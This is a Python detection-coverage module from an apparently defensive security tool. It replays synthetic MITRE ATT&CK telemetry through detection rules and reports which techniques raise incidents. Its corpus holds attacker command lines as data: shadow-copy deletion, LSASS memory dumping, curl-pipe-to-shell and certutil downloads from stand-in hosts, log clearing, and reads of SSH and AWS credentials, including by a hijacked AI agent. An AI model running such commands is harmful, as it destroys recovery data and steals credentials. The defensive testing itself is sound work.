"""Mesure de couverture MITRE ATT&CK — par rejeu, pas par déclaration.

Lister les techniques « couvertes » d'après les règles ne prouve rien. Ce
module **rejoue** un corpus de télémétrie *synthétique* (événements de
processus, détections fichier, connexions, rafales de modification —
décrits, jamais exécutés) dans les **vraies** règles procmon et le **vrai**
moteur inflammatoire, puis mesure ce qui en sort :

  - ``systemic``      : incident systémique (réponse maximale)
  - ``local``         : incident local
  - ``signal_only``   : vu, mais resté sous le seuil (pas d'incident seul)
  - ``not_detected``  : télémétrie disponible, aucune règle ne la voit
  - ``not_observable``: BioCybe n'a aucun capteur pour cette activité

Le corpus contient **volontairement** des techniques que BioCybe ne voit
pas : un rapport de couverture sans trous est un rapport qui ment.

Chaque cas porte le résultat ``expected`` : ``tests/test_coverage.py``
échoue si la couverture régresse (ou progresse sans mise à jour du
corpus) — c'est une suite de non-régression de détection.

Limite : télémétrie synthétique = on mesure la logique de détection et de
corrélation, pas la capacité des capteurs à observer (validée séparément :
tests noyau procmon, validate_inflammation.py). La mesure de bout en bout
contre de vraies techniques se fait dans un labo isolé dédié.
"""

from __future__ import annotations

import json
from collections import Counter
from dataclasses import dataclass, field
from pathlib import Path
from types import SimpleNamespace
from typing import Any

RESULT_ORDER = ("systemic", "local", "signal_only", "not_detected", "not_observable")
RESULT_SCORE = {
    "systemic": 100,
    "local": 70,
    "signal_only": 30,
    "not_detected": 0,
    "not_observable": 0,
}


@dataclass
class Case:
    technique: str
    name: str
    tactic: str
    expected: str
    steps: list[dict[str, Any]] = field(default_factory=list)
    note: str = ""


def _proc(name, cmdline, *, parent="explorer.exe", parent_cmd="", exe=None, pid=4000, ppid=3000):
    return {
        "type": "process",
        "pid": pid,
        "ppid": ppid,
        "name": name,
        "exe": exe or f"C:/Windows/System32/{name}",
        "cmdline": cmdline,
        "parent_name": parent,
        "parent_cmdline": parent_cmd or parent,
    }


def _dns_tunnel_queries(n: int = 30) -> list[dict[str, Any]]:
    """Sous-domaines longs à forte entropie (données encodées), RFC 2606."""
    import hashlib

    return [
        {
            "qname": f"{hashlib.sha256(str(i).encode()).hexdigest()[:40]}.t.exfil-c2.test",
            "qtype": "TXT",
            "dt": 2,
        }
        for i in range(n)
    ]


def _dns_dga_queries(n: int = 30) -> list[dict[str, Any]]:
    import hashlib

    return [
        {
            "qname": f"{hashlib.md5(str(i).encode()).hexdigest()[:14]}.test",
            "rcode": 3,
            "dt": 1,
        }
        for i in range(n)
    ]


_IMPLANT = "/tmp/.x/implant"  # noqa: S108 - chemin décrit (télémétrie synthétique)

# Corpus : chaque ligne de commande est celle qu'enregistrerait un capteur
# (Sysmon EID 1 / proc connector) — aucune n'est exécutée.
CORPUS: list[Case] = [
    # ---- Impact ----------------------------------------------------------
    Case(
        "T1490",
        "Inhibit System Recovery",
        "impact",
        "systemic",
        [_proc("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", parent="cmd.exe")],
        "Règle forte (90) : précurseur ransomware typique.",
    ),
    Case(
        "T1486",
        "Data Encrypted for Impact",
        "impact",
        "systemic",
        [
            {
                "type": "regen_burst",
                "paths": [f"/srv/share/docs/f{i}.docx" for i in range(8)],
            }
        ],
        "Rafale de modifications de fichiers protégés (auto-régénération).",
    ),
    Case(
        "T1565.001",
        "Stored Data Manipulation",
        "impact",
        "signal_only",
        [{"type": "regen_drift", "path": "/etc/app/config.yml"}],
        "Une modification isolée d'un fichier protégé reste un signal faible.",
    ),
    # ---- Execution ------------------------------------------------------
    Case(
        "T1059.001",
        "PowerShell",
        "execution",
        "local",
        [_proc("powershell.exe", "powershell.exe -nop -enc " + "SQBFAFgA" * 6)],
    ),
    Case(
        "T1204.002",
        "Malicious File (macro)",
        "execution",
        "local",
        [
            _proc(
                "powershell.exe",
                "powershell.exe -nop -w hidden",
                parent="WINWORD.EXE",
                parent_cmd="WINWORD.EXE /n invoice.docm",
            )
        ],
    ),
    Case(
        "T1059.004",
        "Unix Shell (download | sh)",
        "execution",
        "local",
        [
            _proc(
                "sh",
                "sh -c curl -fsSL http://update.example.test/i.sh | sh",
                exe="/bin/sh",
                parent="bash",
            )
        ],
    ),
    # ---- Persistence ----------------------------------------------------
    Case(
        "T1505.003",
        "Web Shell",
        "persistence",
        "local",
        [_proc("sh", "sh -c id", exe="/bin/sh", parent="php-fpm", parent_cmd="php-fpm: pool www")],
    ),
    Case(
        "T1053.005",
        "Scheduled Task",
        "persistence",
        "local",
        [
            _proc(
                "schtasks.exe",
                "schtasks.exe /create /sc onlogon /tn Updater /tr C:/Users/Public/u.exe",
                parent="cmd.exe",
            )
        ],
        "Règle schtask_user_writable_payload (charge utile dans un dossier modifiable).",
    ),
    Case(
        "T1547.001",
        "Registry Run Keys",
        "persistence",
        "signal_only",
        [
            _proc(
                "reg.exe",
                r"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v u "
                r"/d C:\Users\Public\u.exe",
                parent="cmd.exe",
            )
        ],
        "Règle registry_run_key (40) : fréquent en légitime, pèse corroboré.",
    ),
    # ---- Credential Access ----------------------------------------------
    Case(
        "T1552.001",
        "Credentials In Files",
        "credential-access",
        "signal_only",
        [_proc("cat", "cat /home/dev/.ssh/id_ed25519", exe="/usr/bin/cat", parent="bash")],
        "Seul : sous le seuil (45). Corroboré (C2, exec /tmp) : incident.",
    ),
    Case(
        "T1003.001",
        "LSASS Memory",
        "credential-access",
        "systemic",
        [
            _proc(
                "rundll32.exe",
                "rundll32.exe C:/Windows/System32/comsvcs.dll, MiniDump 640 C:/t/l.dmp full",
                parent="cmd.exe",
            )
        ],
        "Règle lsass_memory_dump (90, critique).",
    ),
    # ---- Defense Evasion ------------------------------------------------
    Case(
        "T1070.001",
        "Clear Windows Event Logs",
        "defense-evasion",
        "local",
        [_proc("wevtutil.exe", "wevtutil.exe cl Security", parent="cmd.exe")],
        "Règle event_log_cleared (70).",
    ),
    Case(
        "T1055",
        "Process Injection (shellcode RWX dans un processus)",
        "defense-evasion",
        "local",
        [
            {
                "type": "memory",
                "pid": 7100,
                "name": "sshd",
                "exe": "/usr/sbin/sshd",
                "maps": "55d0c0000000-55d0c0010000 r-xp 00000000 08:01 1234 /usr/sbin/sshd\n"
                "7f11a0000000-7f11a0021000 rwxp 00000000 00:00 0 \n",
            }
        ],
        "Capteur injmon : traces mémoire (pas l'acte d'injection lui-même).",
    ),
    Case(
        "T1620",
        "Reflective Code Loading (exécution depuis memfd)",
        "defense-evasion",
        "local",
        [
            {
                "type": "memory",
                "pid": 7200,
                "name": "kworker",
                "exe": "/memfd:  (deleted)",
                "maps": "7f22b0000000-7f22b0100000 r-xp 00000000 00:01 77 /memfd:  (deleted)\n",
            }
        ],
        "Capteur injmon : code exécuté depuis un memfd (fileless).",
    ),
    Case(
        "T1055.012",
        "Process Hollowing (in-memory, sans trace RWX)",
        "defense-evasion",
        "not_observable",
        [],
        "Hollowing propre (sections remappées depuis un fichier) : nécessite ETW-TI / eBPF.",
    ),
    # ---- Command and Control --------------------------------------------
    Case(
        "T1105",
        "Ingress Tool Transfer",
        "command-and-control",
        "local",
        [
            _proc(
                "certutil.exe",
                "certutil.exe -urlcache -split -f http://dl.example.test/a.bin a.bin",
                parent="cmd.exe",
            )
        ],
    ),
    Case(
        "T1071",
        "Application Layer Protocol (C2 connu)",
        "command-and-control",
        "local",
        [{"type": "connection", "exe": "/usr/bin/curl", "ip": "203.0.113.50", "confidence": 80}],
        "Dépend de la fraîcheur des feeds IOC : un C2 inconnu n'est pas vu.",
    ),
    Case(
        "T1071.004",
        "DNS (tunneling)",
        "command-and-control",
        "local",
        [{"type": "dns", "queries": _dns_tunnel_queries()}],
        "Capteur DNS (dnsmon) : sous-domaines uniques longs à forte entropie + TXT.",
    ),
    Case(
        "T1568.002",
        "Domain Generation Algorithms",
        "command-and-control",
        "local",
        [{"type": "dns", "queries": _dns_dga_queries()}],
        "Capteur DNS : rafale NXDOMAIN sur domaines distincts (rcode requis).",
    ),
    # ---- Lateral Movement -----------------------------------------------
    Case(
        "T1021.002",
        "SMB/Admin Shares (PsExec)",
        "lateral-movement",
        "local",
        [
            _proc(
                "PSEXESVC.exe",
                "C:/Windows/PSEXESVC.exe",
                exe="C:/Windows/PSEXESVC.exe",
                parent="services.exe",
            )
        ],
        "Règle psexec_service (50) : PsExec aussi utilisé par les admins.",
    ),
    # ---- Chaînes corrélées (la vraie valeur) ----------------------------
    Case(
        "T1204.002+T1071",
        "Chaîne : implant déposé dans /tmp, exécuté, C2",
        "chain",
        "systemic",
        [
            {"type": "file", "path": _IMPLANT, "severity": "high"},
            _proc("implant", _IMPLANT, exe=_IMPLANT, parent="bash", pid=5000),
            {
                "type": "connection",
                "exe": _IMPLANT,
                "pid": 5000,
                "ip": "198.51.100.7",
                "confidence": 75,
            },
        ],
        "Fichier + exécution + C2 sur le même exe : co-stimulation.",
    ),
    Case(
        "T1059+T1552.001+T1071",
        "Chaîne : agent IA détourné lit des secrets puis contacte un C2",
        "chain",
        "systemic",
        [
            _proc(
                "bash",
                "bash -c cat ~/.aws/credentials",
                exe="/bin/bash",
                parent="node",
                parent_cmd="node /opt/mcp-server/index.js",
                pid=6000,
                ppid=5900,
            ),
            {
                "type": "connection",
                "exe": "/bin/bash",
                "pid": 6000,
                "ip": "203.0.113.99",
                "confidence": 70,
            },
        ],
        "Signal IA faible seul (15) ; corroboré par secrets + C2 : systémique.",
    ),
]


# --------------------------------------------------------------------------- #
# Rejeu
# --------------------------------------------------------------------------- #


def _replay_case(case: Case, rules) -> dict[str, Any]:
    from .inflammation import (
        InflammationEngine,
        from_connection_record,
        from_process_match,
        from_regen_event,
        from_watch_event,
    )
    from .process_monitor import ProcessEvent, ProcessMonitor

    clock = [1_700_000_000.0]
    eng = InflammationEngine(host="coverage-lab", clock=lambda: clock[0])
    mon = ProcessMonitor(rules, provider=list)
    signals = 0
    matched_rules: list[str] = []

    for step in case.steps:
        clock[0] += 5
        kind = step["type"]
        sigs = []
        if kind == "process":
            ev = ProcessEvent(
                **{k: v for k, v in step.items() if k != "type"},
            )
            for m in mon.evaluate(ev):
                matched_rules.append(m.rule.rule_id)
                sigs.append(from_process_match(m))
        elif kind == "file":
            res = SimpleNamespace(
                is_malicious=True,
                severity=step.get("severity", "high"),
                malware_family=None,
                matched_rules=[{"rule": "coverage_case"}],
            )
            sigs.append(
                from_watch_event(
                    SimpleNamespace(
                        is_malicious=True, result=res, path=Path(step["path"]), quarantine=None
                    )
                )
            )
        elif kind == "connection":
            hit = SimpleNamespace(
                confidence=step.get("confidence", 80),
                ioc_type="ip",
                value=step["ip"],
                source="coverage",
                malware="case",
            )
            sigs.append(
                from_connection_record(
                    SimpleNamespace(
                        hit=hit,
                        process_exe=step.get("exe"),
                        pid=step.get("pid"),
                        process_name=Path(step.get("exe") or "?").name,
                        raddr=f"{step['ip']}:443",
                    )
                )
            )
        elif kind == "regen_burst":
            sigs.append(
                from_regen_event(
                    "burst", {"paths": step["paths"], "window_count": len(step["paths"])}
                )
            )
        elif kind == "dns":
            from .dns_monitor import DnsAnalyzer, DnsQuery
            from .inflammation import from_dns_finding

            analyzer = DnsAnalyzer()
            for qd in step["queries"]:
                clock[0] += qd.get("dt", 1)
                for f in analyzer.feed(
                    DnsQuery(
                        qname=qd["qname"],
                        qtype=qd.get("qtype", "A"),
                        rcode=qd.get("rcode"),
                        timestamp=clock[0],
                        client="10.0.0.5",
                    )
                ):
                    sigs.append(from_dns_finding(f))
        elif kind == "memory":
            from .inflammation import from_injection_finding
            from .injection_monitor import InjectionScanner

            for finding in InjectionScanner().analyze_maps(
                step["pid"], step["name"], step["exe"], step["maps"]
            ):
                sigs.append(from_injection_finding(finding))
        elif kind == "regen_drift":
            sigs.append(from_regen_event("drift", {"path": step["path"]}))
        for sig in sigs:
            if sig is not None:
                signals += 1
                eng.ingest(sig)

    incidents = eng.open_incidents() + [i for i in eng.closed_incidents() if i.status != "merged"]
    if not case.steps:
        result = "not_observable"
    elif any(i.severity == "systemic" for i in incidents):
        result = "systemic"
    elif incidents:
        result = "local"
    elif signals:
        result = "signal_only"
    else:
        result = "not_detected"
    return {
        "technique": case.technique,
        "name": case.name,
        "tactic": case.tactic,
        "result": result,
        "expected": case.expected,
        "matches_expected": result == case.expected,
        "signals": signals,
        "rules": sorted(set(matched_rules)),
        "mitre_seen": sorted({m for i in incidents for m in i.mitre}),
        "note": case.note,
    }


def run_coverage(corpus: list[Case] | None = None, rules=None) -> dict[str, Any]:
    """Rejoue le corpus et agrège le rapport."""
    from .process_monitor import load_rules

    rules = rules if rules is not None else load_rules()
    results = [_replay_case(c, rules) for c in (corpus or CORPUS)]
    counts = Counter(r["result"] for r in results)
    total = len(results)
    detected = sum(counts[k] for k in ("systemic", "local"))
    seen = detected + counts["signal_only"]
    by_tactic: dict[str, Counter] = {}
    for r in results:
        by_tactic.setdefault(r["tactic"], Counter())[r["result"]] += 1
    return {
        "total": total,
        "counts": {k: counts.get(k, 0) for k in RESULT_ORDER},
        "incident_rate": round(detected / total, 3) if total else 0.0,
        "visibility_rate": round(seen / total, 3) if total else 0.0,
        "by_tactic": {t: dict(c) for t, c in sorted(by_tactic.items())},
        "results": results,
        "regressions": [r for r in results if not r["matches_expected"]],
    }


def format_report(report: dict[str, Any]) -> str:
    c = report["counts"]
    lines = [
        f"Couverture MITRE ATT&CK — rejeu de {report['total']} cas (télémétrie synthétique)",
        f"  Incident (systémique/local) : {c['systemic'] + c['local']}/{report['total']} "
        f"({report['incident_rate']:.0%})  — systémique {c['systemic']}, local {c['local']}",
        f"  Vu sous le seuil            : {c['signal_only']}",
        f"  Non détecté (pas de règle)  : {c['not_detected']}",
        f"  Non observable (pas de capteur) : {c['not_observable']}",
        "",
    ]
    icon = {
        "systemic": "SYST",
        "local": "LOC ",
        "signal_only": "vu  ",
        "not_detected": "----",
        "not_observable": "n/o ",
    }
    for r in sorted(
        report["results"], key=lambda r: (RESULT_ORDER.index(r["result"]), r["technique"])
    ):
        flag = "" if r["matches_expected"] else f"  !! attendu {r['expected']}"
        lines.append(
            f"  [{icon[r['result']]}] {r['technique']:<22} {r['name'][:52]:<52}"
            f" {','.join(r['rules'])[:40]}{flag}"
        )
    gaps = [r for r in report["results"] if r["result"] in ("not_detected", "not_observable")]
    if gaps:
        lines += ["", "Trous identifiés :"]
        lines += [f"  - {r['technique']} {r['name']} : {r['note']}" for r in gaps]
    return "\n".join(lines)


def navigator_layer(report: dict[str, Any], *, name: str = "BioCybe coverage") -> dict[str, Any]:
    """Couche ATT&CK Navigator (format 4.5) : score 100/70/30/0 par technique."""
    best: dict[str, dict[str, Any]] = {}
    for r in report["results"]:
        if r["tactic"] == "chain":
            continue
        score = RESULT_SCORE[r["result"]]
        if r["technique"] not in best or score > best[r["technique"]]["score"]:
            best[r["technique"]] = {
                "techniqueID": r["technique"],
                "score": score,
                "comment": f"{r['result']} — {r['note']}".strip(" —"),
            }
    return {
        "name": name,
        "versions": {"layer": "4.5", "navigator": "4.9.1", "attack": "15"},
        "domain": "enterprise-attack",
        "description": "Mesuré par rejeu de télémétrie synthétique (biocybe coverage).",
        "gradient": {"colors": ["#ff6666", "#ffe766", "#8ec843"], "minValue": 0, "maxValue": 100},
        "techniques": sorted(best.values(), key=lambda t: t["techniqueID"]),
    }


def write_navigator(report: dict[str, Any], path: str | Path) -> Path:
    path = Path(path)
    path.write_text(json.dumps(navigator_layer(report), indent=2, ensure_ascii=False), "utf-8")
    return path
